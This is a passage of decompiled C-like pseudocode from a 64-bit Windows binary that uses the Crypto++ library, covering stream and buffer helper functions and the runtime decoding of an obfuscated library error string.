    v5 = (((unsigned int)dword_1400DA7B8 >> 13) ^ 32 * dword_1400DA7B8 ^ dword_1400DA7B8) + v4;
    dword_1400DA7B8 ^= ((unsigned int)dword_1400DA7B8 >> 13) ^ 32 * (dword_1400DA7B8 ^ (dword_1400DA7B8 << 12));
    byte_1400DA7D9 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DA7DC = v1 | 2;
    byte_1400DA7E0[0] = v5 ^ 0x55;
    byte_1400DA7E1 = (v5 - 1) ^ 0x6E;
    byte_1400DA7E2 = (v5 - 2) ^ 0x66;
    byte_1400DA7E3 = (v5 - 3) ^ 0x6C;
    byte_1400DA7E4 = (v5 - 4) ^ 0x75;
    byte_1400DA7E5 = (v5 - 5) ^ 0x73;
    byte_1400DA7E6 = (v5 - 6) ^ 0x68;
    byte_1400DA7E7 = (v5 - 7) ^ 0x61;
    byte_1400DA7E8 = (v5 - 8) ^ 0x62;
    byte_1400DA7E9 = (v5 - 9) ^ 0x6C;
    byte_1400DA7EA = (v5 - 10) ^ 0x65;
    byte_1400DA7EB = (v5 - 11) ^ 0x3C;
    byte_1400DA7EC = (v5 - 12) ^ 0x54;
    byte_1400DA7ED = (v5 - 13) ^ 0x3E;
    byte_1400DA7EE = (v5 - 14) ^ 0x3A;
    byte_1400DA7EF = (v5 - 15) ^ 0x20;
    byte_1400DA7F0 = (v5 - 16) ^ 0x74;
    byte_1400DA7F1 = (v5 - 17) ^ 0x68;
    byte_1400DA7F2 = (v5 - 18) ^ 0x69;
    byte_1400DA7F3 = (v5 - 19) ^ 0x73;
    byte_1400DA7F4 = (v5 - 20) ^ 0x20;
    byte_1400DA7F5 = (v5 - 21) ^ 0x6F;
    byte_1400DA7F6 = (v5 - 22) ^ 0x62;
    byte_1400DA7F7 = (v5 - 23) ^ 0x6A;
    byte_1400DA7F8 = (v5 - 24) ^ 0x65;
    byte_1400DA7F9 = (v5 - 25) ^ 0x63;
    byte_1400DA7FA = (v5 - 26) ^ 0x74;
    byte_1400DA7FB = (v5 - 27) ^ 0x20;
    byte_1400DA7FC = (v5 - 28) ^ 0x68;
    byte_1400DA7FD = (v5 - 29) ^ 0x61;
    byte_1400DA7FE = (v5 - 30) ^ 0x73;
    byte_1400DA7FF = (v5 - 31) ^ 0x20;
    byte_1400DA800 = (v5 - 32) ^ 0x62;
    byte_1400DA801 = (v5 - 33) ^ 0x75;
    byte_1400DA802 = (v5 - 34) ^ 0x66;
    byte_1400DA803 = (v5 - 35) ^ 0x66;
    byte_1400DA804 = (v5 - 36) ^ 0x65;
    byte_1400DA805 = (v5 - 37) ^ 0x72;
    byte_1400DA806 = (v5 - 38) ^ 0x65;
    byte_1400DA807 = (v5 - 39) ^ 0x64;
    byte_1400DA808 = (v5 - 40) ^ 0x20;
    byte_1400DA809 = (v5 - 41) ^ 0x69;
    byte_1400DA80A = (v5 - 42) ^ 0x6E;
    byte_1400DA80B = (v5 - 43) ^ 0x70;
    byte_1400DA80C = (v5 - 44) ^ 0x75;
    byte_1400DA80D = (v5 - 45) ^ 0x74;
    byte_1400DA80E = (v5 - 46) ^ 0x20;
    byte_1400DA80F = (v5 - 47) ^ 0x74;
    byte_1400DA810 = (v5 - 48) ^ 0x68;
    byte_1400DA811 = (v5 - 49) ^ 0x61;
    byte_1400DA812 = (v5 - 50) ^ 0x74;
    byte_1400DA813 = (v5 - 51) ^ 0x20;
    byte_1400DA814 = (v5 - 52) ^ 0x63;
    byte_1400DA815 = (v5 - 53) ^ 0x61;
    byte_1400DA816 = (v5 - 54) ^ 0x6E;
    byte_1400DA817 = (v5 - 55) ^ 0x6E;
    byte_1400DA818 = (v5 - 56) ^ 0x6F;
    byte_1400DA819 = (v5 - 57) ^ 0x74;
    byte_1400DA81A = (v5 - 58) ^ 0x20;
    byte_1400DA81B = (v5 - 59) ^ 0x62;
    byte_1400DA81C = (v5 - 60) ^ 0x65;
    byte_1400DA81D = (v5 - 61) ^ 0x20;
    byte_1400DA81E = (v5 - 62) ^ 0x66;
    byte_1400DA81F = (v5 - 63) ^ 0x6C;
    byte_1400DA820 = (v5 - 64) ^ 0x75;
    byte_1400DA821 = (v5 - 65) ^ 0x73;
    byte_1400DA822 = (v5 - 66) ^ 0x68;
    byte_1400DA823 = (v5 - 67) ^ 0x65;
    byte_1400DA824 = (v5 - 68) ^ 0x64;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x45ui64 )
  {
    sub_140004790(Src, 0x45ui64, 0i64);
    v5 = byte_1400DA7D9;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v6[3] = 0i64;
  v6[4] = 0i64;
  v6[5] = 0i64;
  v6[6] = 0i64;
  v6[7] = 0i64;
  *((_DWORD *)v6 + 16) = 0;
  *((_BYTE *)v6 + 68) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 69i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 69) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DA7E0[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x45 );
  return v3;
}
// 1400DA7A4: using guessed type int dword_1400DA7A4;
// 1400DA7B8: using guessed type int dword_1400DA7B8;
// 1400DA7BC: using guessed type int dword_1400DA7BC;
// 1400DA7C0: using guessed type int dword_1400DA7C0;
// 1400DA7D9: using guessed type char byte_1400DA7D9;
// 1400DA7DC: using guessed type int dword_1400DA7DC;
// 1400DA7E1: using guessed type char byte_1400DA7E1;
// 1400DA7E2: using guessed type char byte_1400DA7E2;
// 1400DA7E3: using guessed type char byte_1400DA7E3;
// 1400DA7E4: using guessed type char byte_1400DA7E4;
// 1400DA7E5: using guessed type char byte_1400DA7E5;
// 1400DA7E6: using guessed type char byte_1400DA7E6;
// 1400DA7E7: using guessed type char byte_1400DA7E7;
// 1400DA7E8: using guessed type char byte_1400DA7E8;
// 1400DA7E9: using guessed type char byte_1400DA7E9;
// 1400DA7EA: using guessed type char byte_1400DA7EA;
// 1400DA7EB: using guessed type char byte_1400DA7EB;
// 1400DA7EC: using guessed type char byte_1400DA7EC;
// 1400DA7ED: using guessed type char byte_1400DA7ED;
// 1400DA7EE: using guessed type char byte_1400DA7EE;
// 1400DA7EF: using guessed type char byte_1400DA7EF;
// 1400DA7F0: using guessed type char byte_1400DA7F0;
// 1400DA7F1: using guessed type char byte_1400DA7F1;
// 1400DA7F2: using guessed type char byte_1400DA7F2;
// 1400DA7F3: using guessed type char byte_1400DA7F3;
// 1400DA7F4: using guessed type char byte_1400DA7F4;
// 1400DA7F5: using guessed type char byte_1400DA7F5;
// 1400DA7F6: using guessed type char byte_1400DA7F6;
// 1400DA7F7: using guessed type char byte_1400DA7F7;
// 1400DA7F8: using guessed type char byte_1400DA7F8;
// 1400DA7F9: using guessed type char byte_1400DA7F9;
// 1400DA7FA: using guessed type char byte_1400DA7FA;
// 1400DA7FB: using guessed type char byte_1400DA7FB;
// 1400DA7FC: using guessed type char byte_1400DA7FC;
// 1400DA7FD: using guessed type char byte_1400DA7FD;
// 1400DA7FE: using guessed type char byte_1400DA7FE;
// 1400DA7FF: using guessed type char byte_1400DA7FF;
// 1400DA800: using guessed type char byte_1400DA800;
// 1400DA801: using guessed type char byte_1400DA801;
// 1400DA802: using guessed type char byte_1400DA802;
// 1400DA803: using guessed type char byte_1400DA803;
// 1400DA804: using guessed type char byte_1400DA804;
// 1400DA805: using guessed type char byte_1400DA805;
// 1400DA806: using guessed type char byte_1400DA806;
// 1400DA807: using guessed type char byte_1400DA807;
// 1400DA808: using guessed type char byte_1400DA808;
// 1400DA809: using guessed type char byte_1400DA809;
// 1400DA80A: using guessed type char byte_1400DA80A;
// 1400DA80B: using guessed type char byte_1400DA80B;
// 1400DA80C: using guessed type char byte_1400DA80C;
// 1400DA80D: using guessed type char byte_1400DA80D;
// 1400DA80E: using guessed type char byte_1400DA80E;
// 1400DA80F: using guessed type char byte_1400DA80F;
// 1400DA810: using guessed type char byte_1400DA810;
// 1400DA811: using guessed type char byte_1400DA811;
// 1400DA812: using guessed type char byte_1400DA812;
// 1400DA813: using guessed type char byte_1400DA813;
// 1400DA814: using guessed type char byte_1400DA814;
// 1400DA815: using guessed type char byte_1400DA815;
// 1400DA816: using guessed type char byte_1400DA816;
// 1400DA817: using guessed type char byte_1400DA817;
// 1400DA818: using guessed type char byte_1400DA818;
// 1400DA819: using guessed type char byte_1400DA819;
// 1400DA81A: using guessed type char byte_1400DA81A;
// 1400DA81B: using guessed type char byte_1400DA81B;
// 1400DA81C: using guessed type char byte_1400DA81C;
// 1400DA81D: using guessed type char byte_1400DA81D;
// 1400DA81E: using guessed type char byte_1400DA81E;
// 1400DA81F: using guessed type char byte_1400DA81F;
// 1400DA820: using guessed type char byte_1400DA820;
// 1400DA821: using guessed type char byte_1400DA821;
// 1400DA822: using guessed type char byte_1400DA822;
// 1400DA823: using guessed type char byte_1400DA823;
// 1400DA824: using guessed type char byte_1400DA824;

//----- (0000000140038790) ----------------------------------------------------
__int64 __fastcall sub_140038790(__int64 a1, __int64 a2, __int64 a3)
{
  _QWORD *v3; // r14
  __int64 v4; // rbx
  _QWORD *v5; // rsi
  void *v6; // rdx
  int v7; // edx
  unsigned __int64 v8; // rax
  __int64 v9; // rbx
  void *v10; // rdx
  void *v12; // rdx
  __int64 v13; // [rsp+20h] [rbp-78h]
  __int64 v14; // [rsp+28h] [rbp-70h]
  char v15; // [rsp+30h] [rbp-68h]
  void *v16; // [rsp+38h] [rbp-60h]
  __int64 v17; // [rsp+40h] [rbp-58h]
  unsigned __int64 v18; // [rsp+50h] [rbp-48h]
  void *Memory; // [rsp+58h] [rbp-40h]
  __int64 v20; // [rsp+60h] [rbp-38h]
  __int64 v21; // [rsp+68h] [rbp-30h]
  __int64 v22; // [rsp+70h] [rbp-28h]
  __int64 v23; // [rsp+78h] [rbp-20h]

  v23 = -2i64;
  v3 = (_QWORD *)a3;
  v4 = a2;
  v5 = (_QWORD *)a1;
  v21 = a1;
  v20 = a2;
  v22 = a3;
  v18 = 0i64;
  Memory = 0i64;
  v16 = 0i64;
  v17 = 0i64;
  v15 = 0;
  LOBYTE(v13) = (*(__int64 (__fastcall **)(__int64, void *, void *, char *, _BYTE))(*(_QWORD *)a2 + 8i64))(
                  a2,
                  &unk_1400A8AA0,
                  &CryptoPP::cls_053 `RTTI Type Descriptor',
                  &v15,
                  0);
  if ( (_BYTE)v13 )
  {
    v6 = v16;
    if ( v15 )
      v6 = Memory;
    v14 = (__int64)v6;
    sub_1400394F0((__int64)v5, (__int64)v6);
    v7 = v17;
    if ( v15 )
      v7 = v18;
    v8 = sub_1400395E0(v5, v7);
    goto LABEL_7;
  }
  if ( (*(unsigned __int8 (__fastcall **)(__int64, void *, const unsigned __int8 **, __int64 *, __int64))(*(_QWORD *)v4 + 8i64))(
         v4,
         &unk_1400A8AA0,
         &unsigned char const * `RTTI Type Descriptor',
         &v14,
         v13) )
  {
    sub_1400394F0((__int64)v5, v14);
    v8 = (*(unsigned int (__fastcall **)(_QWORD *))(*v5 + 64i64))(v5);
LABEL_7:
    *v3 = v8;
    v9 = v14;
    v10 = Memory;
    memset(Memory, 0, v18);
    free(v10);
    return v9;
  }
  sub_140039900((__int64)v5);
  *v3 = 0i64;
  v12 = Memory;
  memset(Memory, 0, v18);
  free(v12);
  return 0i64;
}
// 1400D90C0: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';

//----- (00000001400388F0) ----------------------------------------------------
__int64 __fastcall sub_1400388F0(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 320i64))(a1 - 8);
  if ( result )
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(result + 8) + 8i64))(result + 8);
  return result;
}

//----- (0000000140038920) ----------------------------------------------------
__int64 __fastcall sub_140038920(__int64 a1, _QWORD *a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  _QWORD *v5; // rsi
  unsigned int v6; // eax

  v3 = *a2;
  v4 = a3;
  v5 = a2;
  v6 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 64i64))();
  return (*(__int64 (__fastcall **)(_QWORD *, __int64, _QWORD))(v3 + 64))(v5, v4, v6);
}

//----- (0000000140038960) ----------------------------------------------------
__int64 __fastcall sub_140038960(__int64 a1)
{
  __int64 v1; // rbx
  __int64 result; // rax
  __int64 v3; // rax

  v1 = a1;
  result = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  if ( result )
  {
    v3 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 328i64))(v1);
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 200i64))(v3);
  }
  return result;
}

//----- (00000001400389A0) ----------------------------------------------------
__int64 __fastcall sub_1400389A0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  __int64 result; // rax

  v3 = a3;
  v4 = a2;
  result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 328i64))(a1 - 8);
  if ( result )
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)(result + 8) + 16i64))(
               result + 8,
               v4,
               v3);
  return result;
}

//----- (00000001400389E0) ----------------------------------------------------
__int64 __fastcall sub_1400389E0(__int64 *a1, _WORD *a2, int a3)
{
  __int64 v3; // rbx
  __int64 *v4; // rdi
  __int64 v5; // rax

  v3 = *a1;
  v4 = a1;
  v5 = sub_140038ED0(a1, a2, a3);
  return (*(__int64 (__fastcall **)(__int64 *, __int64))(v3 + 168))(v4, v5);
}

//----- (0000000140038A10) ----------------------------------------------------
__int64 __fastcall sub_140038A10(__int64 *a1, int *a2, int a3)
{
  __int64 v3; // rbx
  __int64 *v4; // rdi
  __int64 v5; // rax

  v3 = *a1;
  v4 = a1;
  v5 = sub_140038F50(a1, a2, a3);
  return (*(__int64 (__fastcall **)(__int64 *, __int64))(v3 + 168))(v4, v5);
}

//----- (0000000140038A40) ----------------------------------------------------
void __noreturn sub_140038A40()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140038B00) ----------------------------------------------------
__int64 __fastcall sub_140038B00(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 56i64))();
}

//----- (0000000140038B10) ----------------------------------------------------
__int64 __fastcall sub_140038B10(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax
  __int64 result; // rax
  char v4; // ST28_1
  __int64 v5; // [rsp+30h] [rbp-18h]
  __int64 v6; // [rsp+38h] [rbp-10h]

  v6 = -2i64;
  v1 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 320i64))() )
  {
    v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 320i64))(v1);
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 120i64))(v2);
  }
  else
  {
    if ( !(dword_1400DA840 & 1) )
    {
      dword_1400DA840 |= 1u;
      qword_1400DA828 = (__int64)&off_1400A87C8;
      qword_1400DA830 = (__int64)off_1400A9A98;
      atexit(sub_1400A0060);
    }
    v5 = 0i64;
    v4 = 1;
    (*(void (__fastcall **)(__int64, __int64 *, __int64 *, signed __int64, void **, char))(*(_QWORD *)v1 + 256i64))(
      v1,
      &qword_1400DA828,
      &v5,
      -1i64,
      &qword_1400D8080,
      v4);
    result = v5;
  }
  return result;
}
// 1400A87C8: using guessed type __int64 (__fastcall *off_1400A87C8)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400DA828: using guessed type __int64 qword_1400DA828;
// 1400DA830: using guessed type __int64 qword_1400DA830;
// 1400DA840: using guessed type int dword_1400DA840;

//----- (0000000140038BD0) ----------------------------------------------------
__int64 __fastcall sub_140038BD0(__int64 a1, __int64 a2, unsigned __int8 a3)
{
  return (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 72i64))(a1, a3);
}

//----- (0000000140038BE0) ----------------------------------------------------
__int64 __fastcall sub_140038BE0(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = (_QWORD *)a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *v2 = &off_1400A8928;
    result = sub_1400370B0((__int64)(v2 + 4), v3 + 32);
  }
  return result;
}
// 1400A8928: using guessed type __int64 (__fastcall *off_1400A8928)(void *);

//----- (0000000140038C40) ----------------------------------------------------
void __fastcall sub_140038C40(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  void *v3; // rdx
  __int64 v4; // rbx
  unsigned __int64 v5; // rcx
  void *v6; // rax

  v2 = a2;
  v3 = *(void **)(a1 + 16);
  v4 = a1;
  v5 = *(_QWORD *)(a1 + 8);
  if ( v5 == v2 )
  {
    *(_QWORD *)(v4 + 16) = v3;
    *(_QWORD *)(v4 + 8) = v2;
  }
  else
  {
    memset(v3, 0, v5);
    free(v3);
    sub_1400255A0(v2);
    if ( v2 )
    {
      v6 = sub_14003A000(v2);
      *(_QWORD *)(v4 + 8) = v2;
      *(_QWORD *)(v4 + 16) = v6;
    }
    else
    {
      *(_QWORD *)(v4 + 8) = 0i64;
      *(_QWORD *)(v4 + 16) = 0i64;
    }
  }
}

//----- (0000000140038CD0) ----------------------------------------------------
__int64 __fastcall sub_140038CD0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 v2; // rax
  __int64 result; // rax
  __int64 v4; // rax

  v1 = a1;
  if ( (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 320i64))(a1) )
  {
    v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 320i64))(v1);
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 184i64))(v2);
  }
  else
  {
    if ( !(dword_1400DA840 & 1) )
    {
      dword_1400DA840 |= 1u;
      qword_1400DA828 = (__int64)&off_1400A87C8;
      qword_1400DA830 = (__int64)off_1400A9A98;
      atexit(sub_1400A0060);
    }
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 320i64))(v1);
    if ( result )
    {
      v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 320i64))(v1);
      result = sub_140037A80(v4);
    }
  }
  return result;
}
// 1400A87C8: using guessed type __int64 (__fastcall *off_1400A87C8)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();
// 1400DA828: using guessed type __int64 qword_1400DA828;
// 1400DA830: using guessed type __int64 qword_1400DA830;
// 1400DA840: using guessed type int dword_1400DA840;

//----- (0000000140038D90) ----------------------------------------------------
__int64 __fastcall sub_140038D90(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 184i64))();
}

//----- (0000000140038DA0) ----------------------------------------------------
__int64 __fastcall sub_140038DA0(__int64 *a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 *v3; // rbx
  bool v4; // zf
  __int64 v5; // rax
  __int64 v6; // rax

  v2 = a2;
  v3 = a1;
  v4 = (*(__int64 (**)(void))(*a1 + 320))() == 0;
  v5 = *v3;
  if ( v4 )
    return (*(__int64 (__fastcall **)(__int64 *, __int64, signed __int64))(v5 + 152))(v3, v2, 1i64);
  v6 = (*(__int64 (__fastcall **)(__int64 *))(v5 + 320))(v3);
  return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v6 + 160i64))(v6, v2);
}

//----- (0000000140038E00) ----------------------------------------------------
__int64 __fastcall sub_140038E00(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbx
  __int64 v6; // rax
  __int64 result; // rax
  char v8; // ST28_1
  __int64 v9; // [rsp+30h] [rbp-68h]
  __int64 v10; // [rsp+38h] [rbp-60h]
  __int64 (__fastcall **v11)(); // [rsp+40h] [rbp-58h]
  __int64 (__fastcall **v12)(); // [rsp+48h] [rbp-50h]
  __int64 v13; // [rsp+58h] [rbp-40h]
  __int64 v14; // [rsp+60h] [rbp-38h]
  __int64 v15; // [rsp+68h] [rbp-30h]

  v10 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 320i64))() )
  {
    v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5 + 320i64))(v5);
    result = (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v6 + 152i64))(v6, v4, v3);
  }
  else
  {
    v11 = &off_1400A8940;
    v12 = off_1400A9A98;
    v13 = v4;
    v14 = v3;
    v15 = 0i64;
    v9 = 0i64;
    v8 = 1;
    (*(void (__fastcall **)(__int64, __int64 (__fastcall ***)(), __int64 *, __int64, void **, char))(*(_QWORD *)v5 + 256i64))(
      v5,
      &v11,
      &v9,
      v3,
      &qword_1400D8080,
      v8);
    result = v9;
  }
  return result;
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (0000000140038ED0) ----------------------------------------------------
__int64 __fastcall sub_140038ED0(__int64 *a1, _WORD *a2, int a3)
{
  __int64 v3; // rax
  _WORD *v4; // rdi
  int v5; // ebx
  __int64 result; // rax
  unsigned __int16 v7; // [rsp+40h] [rbp+18h]

  v3 = *a1;
  v4 = a2;
  v5 = a3;
  v7 = 0;
  result = (*(__int64 (__fastcall **)(__int64 *, unsigned __int16 *, signed __int64))(v3 + 152))(a1, &v7, 2i64);
  if ( v5 )
    *v4 = _byteswap_ushort(v7);
  else
    *v4 = (unsigned __int8)v7 | (unsigned __int16)(HIBYTE(v7) << 8);
  return result;
}

//----- (0000000140038F50) ----------------------------------------------------
__int64 __fastcall sub_140038F50(__int64 *a1, int *a2, int a3)
{
  __int64 v3; // rax
  int *v4; // rdi
  int v5; // ebx
  __int64 result; // rax
  int v7; // [rsp+40h] [rbp+18h]

  v3 = *a1;
  v4 = a2;
  v5 = a3;
  v7 = 0;
  result = (*(__int64 (__fastcall **)(__int64 *, int *, signed __int64))(v3 + 152))(a1, &v7, 4i64);
  if ( v5 )
    *v4 = HIBYTE(v7) | ((BYTE2(v7) | ((BYTE1(v7) | ((unsigned __int8)v7 << 8)) << 8)) << 8);
  else
    *v4 = (unsigned __int8)v7 | ((BYTE1(v7) | (HIWORD(v7) << 8)) << 8);
  return result;
}

//----- (0000000140038FF0) ----------------------------------------------------
__int64 __fastcall sub_140038FF0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rbp
  __int64 v6; // rsi
  __int64 v7; // rdi
  __int64 result; // rax
  char v9; // [rsp+28h] [rbp-A0h]
  __int64 v10; // [rsp+38h] [rbp-90h]
  __int64 v11; // [rsp+40h] [rbp-88h]
  __int64 (__fastcall **v12)(void *); // [rsp+50h] [rbp-78h]
  int v13; // [rsp+68h] [rbp-60h]
  char Dst; // [rsp+70h] [rbp-58h]
  __int64 v15; // [rsp+80h] [rbp-48h]
  __int64 v16; // [rsp+88h] [rbp-40h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  result = (*(unsigned int (__cdecl **)(__int64))(*(_QWORD *)a1 + 24i64))(a1);
  if ( v4 == (unsigned int)result )
    return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v7 + 56i64))(v7, v6, v5, v4);
  if ( v4 )
  {
    v11 = 15i64;
    v10 = 0i64;
    v9 = 0;
    sub_140004F20(&v9, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v12);
    v12 = &off_1400A8798;
    v13 = 0;
    v16 = 15i64;
    v15 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v9, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v12 = &off_1400A8798;
    CxxThrowException(&v12, &_TI3_AVcls_004_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (0000000140039100) ----------------------------------------------------
__int64 __fastcall sub_140039100(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 40i64))();
}

//----- (0000000140039110) ----------------------------------------------------
__int64 __fastcall sub_140039110(__int64 *a1, unsigned int a2, int a3, char a4)
{
  __int64 v4; // rax
  char v5; // ST28_1
  int v6; // ST20_4

  if ( a3 )
    a2 = _byteswap_ulong(a2);
  v4 = *a1;
  v5 = a4;
  *((_DWORD *)a1 + 4) = a2;
  v6 = 0;
  return (*(__int64 (__fastcall **)(__int64 *, void **, __int64 *, signed __int64, int, char))(v4 + 272))(
           a1,
           &qword_1400D8080,
           a1 + 2,
           4i64,
           v6,
           v5);
}

//----- (0000000140039150) ----------------------------------------------------
__int64 __fastcall sub_140039150(__int64 a1, __int64 a2, __int64 a3, void (__fastcall ***a4)(_QWORD, signed __int64))
{
  void (__fastcall ***v4)(_QWORD, signed __int64); // rbx
  __int64 v5; // rdi

  v4 = a4;
  v5 = a2;
  (*(void (__cdecl **)(__int64))(*(_QWORD *)a1 + 120i64))(a1);
  if ( v4 )
    (**v4)(v4, 1i64);
  return v5;
}

//----- (00000001400391A0) ----------------------------------------------------
__int64 __fastcall sub_1400391A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7)
{
  __int64 v7; // rdi
  __int64 v8; // rsi
  __int64 v9; // rbp
  __int64 v10; // r14
  __int64 v11; // rbx

  v7 = a4;
  v8 = a3;
  v9 = a2;
  v10 = a1;
  v11 = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)a1 + 72i64))(a1);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v10 + 80i64))(v10, v11, a6, a7);
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v11 + 24i64))(v11, v7, a5);
  (*(void (__fastcall **)(__int64, __int64, __int64, __int64))(*(_QWORD *)v10 + 120i64))(v10, v9, v8, v11);
  (**(void (__fastcall ***)(__int64, signed __int64))v11)(v11, 1i64);
  return v9;
}

//----- (0000000140039240) ----------------------------------------------------
__int64 __fastcall sub_140039240(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4)
{
  __int64 v4; // rsi
  __int64 v5; // rbx
  unsigned int v6; // edi
  __int64 v7; // r14

  v4 = a2;
  v5 = a4;
  v6 = a3;
  v7 = a1;
  sub_140039770(a1, a3);
  return (*(__int64 (__fastcall **)(__int64, __int64, _QWORD, __int64))(*(_QWORD *)v7 + 112i64))(v7, v4, v6, v5);
}

//----- (00000001400392A0) ----------------------------------------------------
__int64 __fastcall sub_1400392A0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 result; // rax
  __int64 v5; // rax

  v2 = a2;
  v3 = a1;
  result = (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))();
  if ( result )
  {
    v5 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 328i64))(v3);
    result = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v5 + 304i64))(v5, v2);
  }
  return result;
}

//----- (00000001400392F0) ----------------------------------------------------
__int64 __fastcall sub_1400392F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 v4; // rax
  __int64 result; // rax
  char v6; // ST20_1
  __int64 v7; // [rsp+30h] [rbp-18h]
  __int64 v8; // [rsp+38h] [rbp-10h]

  v8 = -2i64;
  v2 = a2;
  v3 = a1;
  if ( (*(__int64 (**)(void))(*(_QWORD *)a1 + 328i64))() )
  {
    v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 328i64))(v3);
